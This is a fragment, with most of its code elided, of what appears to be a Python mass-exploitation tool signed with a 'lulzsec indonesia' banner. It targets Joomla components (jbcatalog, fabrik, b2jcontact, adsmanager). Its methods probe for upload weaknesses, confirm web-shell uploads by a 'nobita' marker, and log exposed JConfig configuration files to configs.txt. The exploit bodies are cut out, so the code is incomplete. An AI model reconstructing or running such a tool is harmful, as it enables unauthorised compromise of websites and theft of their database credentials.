...
class Master:
  ...
  _		      _                               _               _   _                    
 | |  _   _  | |  ____  ___    ___    ___    (_)  _ __     __| | (_)   __ _ 
 | | | | | | | | |_  / / __|  / _ \  / __|   | | | '_ \   / _` | | |  / _` |
 | | | |_| | | |  / /  \__ \ |  __/ | (__    | | | | | | | (_| | | | | (_| |
 |_|  \__,_| |_| /___| |___/  \___|  \___|   |_| |_| |_|  \__,_| |_|  \__,_|
	...
	def com_jbcatalog(self, url):
		...
		try:
			...
			if 'jQuery File' in check_jbcatalog.content:
				...
				if 'nobita' in Shell_jbcatalog.content:
	...
	def com_fabrik(self, url):
		...
		try:
			...
			if 'filepath":' in check_fabrik.content:
				...
				if 'nobita' in Shell_fabrik.content:			
	...
	def com_b2jcontact(self, url):
		...
		try:
			...
			if 'nobita' in check_lib.content:			
	...
	def com_adsmanager(self, url):
		...
		try:
			...
			if '{"jsonrpc" : "2.0",' in check_adsm.content:
				...
				if 'nobita' in check_shell.content:
	...
	def com_configs(self, url, path, line):
		...
		try:
			...
			if 'class JConfig' in req_download.content:
				...
				open('configs.txt', 'a').write(url+path+'\n')
